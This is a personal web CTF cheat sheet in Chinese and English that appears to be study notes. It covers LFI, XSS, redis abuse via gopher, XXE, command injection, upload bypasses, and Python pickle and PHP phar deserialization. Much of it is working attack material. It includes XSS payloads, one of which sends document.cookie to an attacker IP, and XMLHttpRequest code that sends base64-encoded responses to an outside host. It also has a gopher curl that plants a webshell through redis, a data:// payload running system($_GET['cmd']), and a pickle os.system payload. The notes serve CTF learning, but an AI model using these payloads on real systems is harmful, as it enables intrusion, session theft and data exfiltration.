Web CTF CheatSheet & Learning
===

###### tags: `WEB 🎃` `CTF 👻`

Helpful Resource
===
- [Web CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet)

Learning Resource
===
- [HackmeCTF](https://hackme.inndy.tw/)
- AIS3 2019 Pre-exam 

## helpful tool
- ngrok
    - 可以給你一組 public ip 對應到你的 tunnel

## LFI
- 直接 `../../etc/passwd` 測試
- 其他方法
    - `../etc/passwd%00`
    - 查看 source code
        - php://filter/convert.base64-encode/resource
- 敏感文件
    - log `/var/log/...`
    - config `/etc/...`
    - history `~/.history`
    - 環境變數 `/proc/self/environ`
        - 改變 User-Agent header 並發出 request
### LFI to RCE
- 發現可以 LFI 後, 可以用:
    - Session files `/tmp/sess_{SESSION_ID}`
        - 又稱作 Session poisoning
        - 可以得到 session 內的資料
    - /proc/self/fd/\<number> (File descriptor)
        - exposes the file descriptor of all processes
        - 顯示所有需要 file descriptor 的 process
            - e.g. /var/log/apache2/access.log
## XSS
### type
- 反射型:
    - server 針對用戶輸入做回應
    - 通常傷害較低, 必須藉由點擊惡意連結才能達成攻擊
    - ex. `http://url?name=<script>alert(1)</script>`
- 儲存型:
    - 輸入的 payload 會存在 server, 如留言板的留言
- DOM:
    - 瀏覽器 DOM 解析惡意資料
    - ex.
        - `<img src='http://url/user-image'>`: payload 為 `user-image`, 正常
        - `<img src='' onerror=alert(1)'>`: payload 為 `' onerror=alert(1)`, 惡意

### payload
- `<script>alert(1)</script>`: 元老級 xss 測試 payload
- `<svg onload=alert(1)></svg>`
    - `<svg/onload=alert(1)></svg>`: 反斜線可以 bypass 空格限制
    - 另一種方式: 換行
        ```html
        <svg
        onload=alert(1)>
        ```
- `<img src=## onerror=alert(1)`: 圖片內嵌
- `<a href="javascript:alert(1)">g</a>`: 連結 call function
- `<iframe src="javascript:alert(1)"></iframe>`: iframe 內嵌
- alert`1`: 反斜線限制
- `&#x61;&#x62;...`: HTML entity 中 hex 編碼
    - `&#40;&#41;`: 為 decimal 編碼
    - `ex: <img src=x onerror=alert&#x28;1&#x29;>`
- `javascript:windows.location.href('http://<ip>?cookie='+document.cookie);`: 跳轉頁面
- javascript encode
    - \73\72: decimal
    - \u0034: unicode
        - equal to `\u{34}`
    - \x3A: hex

### xmlhttp 內網請求
我們能利用 ajax xmlhttp 實現網頁跳轉請求
[PS. 有關 html header](https://notfalse.net/40/http-representation)
- GET 的 payload
    ```javascript
    xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.location.href = "https://careertest.ncu.edu.tw?body="+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("GET", "request.php");
    xmlhttp.send();
    ```
- POST 的 payload
    ```javascript
    xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.location.href = "https://careertest.ncu.edu.tw?body="+btoa(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST", "request.php", true);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlhttp.send("url=file:///var/www/html/config.html");
    ```
    - POST 必須加上 header `Content-Type` 來告訴 server content 的編碼方式
        - 常見是 `application/x-www-form-urlencoded`, 此 header 告訴 server POST form 是 key->value 的形式
    - onreadystatechange 為 send 事件的狀態碼, 4 為 complete.
    - `open(method, url, true/false)` true 為 async, 表不同步

### redis
redis 是一個 in-memory key-value 的 database, 就像是 database 在做 cache, 能夠大大提昇效能
- 在沒認證機制下, 很容易被攻擊
- 用 RESP (REdis Serialization Protocol) 當作協定
    - 將使用者資料序列化後傳輸
    - 規則大致如下
        - command 會變成 bulk string & array 存入 redis
        - data type 取決於第一個 byte
            - +: simple string
            - -: error
            - :: integer
            - $ + bulk string size
            - \* + array size
                - 接下來是 strings
            - 以 CRLF 結束 (\r\n)
                - 0d0a
                - %0d%0a
        - e.g.
        ```
        redis-cli> set name test
        OK
        redis-cli> get name
        "test"
        
        ## 會轉成
        *3 ## array size 為 3
        $3 ## "set" size 為 3
        set
        $4
        name
        $4
        test
        +OK ## simple string
        *2
        $3
        get
        $4
        name
        $4 ## 回傳 "test", size 為 4
        test
        ```
- 在攻擊 redis, 可以使用 gopher 協議傳送 tcp stream
    - 格式為 `gopher:/ip:port/_ + payload`
    - payload 為 hex 編碼
- 可以透過 tcpdump 做測試
    ```shell
    tcpdump port 6379 -w <filename>
    ```
    - `*<array長度>` ex. set name test ==> \*3
    - `$<字串長>` ex. name ==> $4
- redis payload
    - source
        ```
        flushall
        config set dir /path/of/redis ### 設定 redis 儲存路徑
        config set dbfilename redis-filename ### 設定 redis 檔案名稱
        set webshell "<?php phpinfo(); ?>"
        save
        quit
        ```
    - get key
        ```
        KEYS *
        ```
    - url 編碼過得
        ```
        curl gopher://127.0.0.1:6379/_flushall%0D%0Aconfig%20set%20dir%20/path/of/redis%0D%0Aconfig%20set%20dbfilename%20redis-filename%0D%0Aset%20webshell%20%22%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%22%0D%0Asave
        ```
        - 直接用 curl, 所以不需要 double encode
    - 注意
        - redis 都是以 \r\n （CRLF) 當結尾
        - 傳送時 browser decode 一次, 所以需要 double url encode

### Get Data
- `document.cookie`: cookie
- `document.documentElement.innerHTML` source code
    - `btoa(document.documentElement.innerHTML)`: base64 後的
- `document.body.innerHTML`

## XML
- XML format
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE jerry[
<!ENTITY xxe SYSTEM "https://url/file.txt">
]>

<root>
&xxe;
</root>
```
- payload 需要 URL encode (&xxe 會炸掉)

## Command Injection
- `A;B`: 不管 A 是否正確, B 皆會執行
- `A&B`: A bg, B fg, 同步
- `A&&B`: A 做完換 B
- `A|B`: A 結果傳給 B
- `A||B`: A 失敗才會 B
- 當 `preg_match` multiple line mode 時(/m)
    - `^`: metacharacter, start of string
    - `$`: metacharacter, end of string
    - 在此 modifier, `preg_match` 只會判斷第一行
- php `header(url)` ==執行完== php 後跳轉至 url, 不過用 curl 抓, 可以抓到執行結果

## .git
- dump .git 路徑下的資料
    - [GitDump](https://github.com/Ebryx/GitDump)
- 取得 objects 內被 hash 後的資料
    - `git cat-file -p <object>`
        - object in .git
        - Provide content or type and size information for repository objects
- [tutorial](https://www.slmt.tw/blog/2016/08/21/dont-expose-your-git-dir/)

## vuln
- bypass `strcmp()`
    - https://www.php.net/manual/en/function.strcmp.php#108563
    - string 與空 array 比會 return true
- python
    - `__import__('os').popen(command)`
        - `__import__()` 為一個 built-in function, 動態載入 lib
    - `eval()`
        - 執行一個表達式
    - `exec()`
        - 可以執行多個表達式
    - flask
        - `app.view_functions['function']` 可以取得 function, 也能透過 overwrite 蓋過
- nodejs
    - disallow: node_modules => 代表有 package.json
    - js number is always double
    - ![](https://i.imgur.com/qMBTya7.png)
        - 對 js 來說, 在做加法時, 會捨棄極小位數的值 (1e-14 後的)

## command
- curl
    - `curl url -b 'cookie1=val1; cookie2=val2'`
        - curl with cookie

## IDOR (insecure direct object reference)
- e.g. http://url?user_id=99
    - 若改成 user_id=1, 有可能會取得 admin 的資料
      
## net
- `/proc/net/fib_trie`
    - 查看本機的內網資訊

## bypass mime
- e.g. `curl -i -X POST http://localhost/Pass-02/index.php -H "Content-Type: image/jpeg" -F "data=@webshell.php"`
    - 偽造 content-type

## upload file
- apache
    - htaccess
        - `.htaccess` 為 Hypertext Access, 可以以資料夾為單位做設定
        - 透過更改 `.htaccess` 將特定檔名或副檔名當作 php 來解析
        ```
        AddHandler application/x-httpd-php .ext

        <FilesMatch "fname">
            SetHandler application/x-httpd-php
        </FilesMatch>
        ```
        - 前提
            - AllowOverride All 要開
                - in /etc/apache2/site-enabled/default000-conf
                    ```
                    <Directory "/var/www/html">
                         AllowOverride All
                    </Directory>
                    ```
            - mod_rewrite 要開
                - `sudo a2enmod rewrite`
    - user.ini
        - `user.ini` 可以說是 user 自定義的 `php.ini`, 有 PHP_INI_PREDIR 以及 PHP_INI_USER 的 INI 可以設定
        - 能被動態加載, 更新時間為每 5 分鐘
        - 可以設定的 INI
            - https://www.php.net/manual/zh/ini.list.php
        - 前提
            - php 要用 fastcgi 跑
        - 可以利用 & 權限符合的 INI
            - auto_append_file
            - auto_prepend_file
            - 用法
                ```
                auto_append_file = "/path/to/file"
                auto_prepend_file = "/path/to/file"
                ```
    - `trim()`
        - 沒有 trim 的情況下, '.php ' 會被當作 '.php' 解析, 因此也能夠 bypass
    - `deldot()`
        - 沒有刪除結尾點的情況下, '.php.' 會被當作 '.php' 解析
    - apache 遇到無法是別的副檔名, 會嘗試向左找
        - p.s. 能夠被解析成 php 的 .ext: php3, php4, php5, pht, phtml
- nginx
    - PHP CGI
        - fastcgi 為一通訊協議 (like http), server 將 client 的 request 打包成 fastcgi 協定的形式, 在丟給 php-fpm (fastcgi process manager)
            - 實際執行時由多個 record 實踐
            - https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
        - struct
        ```clike
        typedef struct {
            unsigned char version;
            unsigned char type; // record type
            unsigned char requestIdB1; // record ip
            unsigned char requestIdB0;
            unsigned char contentLengthB1; // body size
            unsigned char contentLengthB0;
            unsigned char paddingLength; // padding size
            unsigned char reserved; 

            /* Body */
            unsigned char contentData[contentLength];
            unsigned char paddingData[paddingLength];
        } FCGI_Record;
        ```
        - nginx 得到 request 時, 會將其轉成 key:value pairs, 傳送給後端, 也就是 php 的 `$_SERVER` 環境變數
        - **WARNING**
            - php 7.X
            - nginx 1.X
            - 假如輸入 http://127.0.0.1/favicon.ico/.php
                - 因為 .php 找不到, 所以 fpm 會將最後的 `/` 除去, 因此解析 favicon.ico.php
            - 解法
                - fastcgi_split_path_info
                - security.limit_extensions
            - 利用 auto_prepend_file and auto_append_file 加入 php://input, 則每次 access php file 時就會自動加入 post data
                - 傳給 php-fpm 時加上
                ```
                {
                    ...
                    'PHP_VALUE': 'auto_prepend_file = php://input',
                    'PHP_ADMIN_VALUE': 'allow_url_include = On'
                    ...
                }
                ```
- %00 截斷
    - 在路徑上使用以 %00 為結尾的字串, 就能直接以路徑當作"路徑+檔案名稱"
    - 條件
        - PHP < 5.3.29
        - magic_quotes_gpc 關的
- `getimagesize()`
    - 一樣是在圖片後塞東西, 在用 LFI 執行
        - `cat file1.png file2.php > file3.png`
- 條件競爭 (race condition)
    - 發生在後端會先將檔案儲存至可以 access 的地方後, 才判斷條件式並決定是否 unlink file
    - 若是不斷發請求存取該上傳檔案, 則可以在檔案被 unlink 前 access 到

## php shell
- system()
    - 輸出並返回最後一行shell結果
- exec()
    - 不輸出結果，返回最後一行shell結果，所有結果可以保存到一個返回的 array 裡面
    - 可用 `print_r()` 將其 dump
- passthru
    - 只調用命令，把命令的運行結果原樣地直接輸出到標準輸出設備上

## php filter
![](https://i.imgur.com/6LDZiED.png)

## python sandbox
- python 2.7
    - https://xz.aliyun.com/t/52
    - https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
    - 如果要使用 shell, 要 import os, commands, subprocess (e.g. `__import__('os')`)
        - or importlib.import_module('module')
    - call builtin func
        - `__builtin__.func()`
    - 列出 module / class 下的所有 attr / func
        - `__dict__`
- pickle
    - ![](https://i.imgur.com/bCNfGJx.png)
        - c: 讀 module name, 接著的下行是 object name
            - 亦即讀取 module.object
        - (     t    ===    (    )
        - S: 讀一個 string
        - R: call function
        - . end of pickle
    - payload
    ```
    class evil(object):
        def __reduce__(self):
            return (os.system, ('/bin/bash ...', ))
    ```
## php

### php-phar
- https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1
- https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2
- 將多個 php and resource 打包成==單一檔案== xxx.phar, 讓 php 更可攜 (像是 java 的 jar)
- 安全疑慮的關係, 預設是被禁用的, 必須更改設定檔 (php.ini) 才能使用
```
[Phar]
; http://php.net/phar.readonly
phar.readonly = Off
```
- 使用方式
```php
<?php
$p = new Phar('test.phar');

$p->startBuffering();

## stub: phar 的 bootstrap code, 當 phar 自己被執行時會執行這段 code
$p->setStub($p->createDefaultStub('main.php'));
## 在 load phar (phar://file) 時會 unserialize() metadata, 以下例子會直接新增 some_evil_class 的 instance
$p->setMetadata(new some_evil_class());
## 建立 phar 的內部構造, e.g. {'main.php': '<?php....'}
$p->addFromString('main.php', '<?php echo "test...\n";>');

$p->stopBuffering();
```

### stream & wrapper
- stream
    - transmission of data from source to target
        - tcp/udp
    - format
        - wrapper://source
    - 傳輸步驟大概分成:
        1. Connection established
        2. Data read
        3. Data written
        4. Connection ended


### 疑慮
- Deserialization problem
    - Serialization
        - the process of storing an object’s properties in a binary format
    - php 中, serialization 只會存 object 的 properties 以及 class name, 並不會存 method
        - 但是在 php 內部卻會執行 magic method
        - https://culttt.com/2014/04/16/php-magic-methods/
    - phar 中, 有兩個 magic methods 會被 trigger
        - `__wakeup()`
            - 當 object 被 deserialize 時執行
        - `__destruct()`
            - 當 object 被 destroy 時執行
    - php interact with stream
        - common wrapper in php
            - file://
            - http://
            - ftp://
            - php://
            - phar://
        - **stream 在 accrss 時並不會檢查副檔名**
            - e.g. phar:///tmp/secret.txt
        - 如果有 filesystem function 被 phar stream 執行, phar 的 serialized metada 將會 unserialized
        - filesystem function
            - ![](https://i.imgur.com/NH5wULz.png)
    - `print_r(stream_get_wrappers())` 可以看有哪些 wrapper 可以使用

### bypass
- blacklist
    - 當 `http://` or `file://` 的 wrapper 不能用, 可以用 `php://input`, 能夠將 post data body 當作 php 執行
    - `php://` 被 block, 可以用 `data://`
        - payload: `http://url?go=data://text/plain,+<?php+system($_GET['cmd']);`
        - payload: `http://url?go=data://text/plain;base64,PD9waHArc3lzdGVtKCRfR0VUWydjbWQnXSk7`
    - 但是有些預設會被擋 (allow_url_include, in php.ini)
        - php://input
        - php://stdin
        - php://memory

### POP chain (Property Oriented Programming)
- 像是 ROP 一樣的概念, 用現有的程式碼達成目的
    - 大多是 `__wakeup()`, `__destruct()`, `__toString()`
- [tool](https://github.com/ambionics/phpggc)
    - code
    ```shell
    ./phpgcc -l # list POP
    ```
- 著名的 laravel CVE-2018-15133
    - https://m0nit0r.top/2020/03/01/laravel-CVE-2018-15133/


## OWASP top 10
- Injection
    - sqli
- Broken Authentication
- Sensitive Data Exposure
- XML External Entities (XXE)
    - XXE
- Broken Access Control
- Security Misconfiguration
- ross-Site Scripting XSS
    - XSS
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring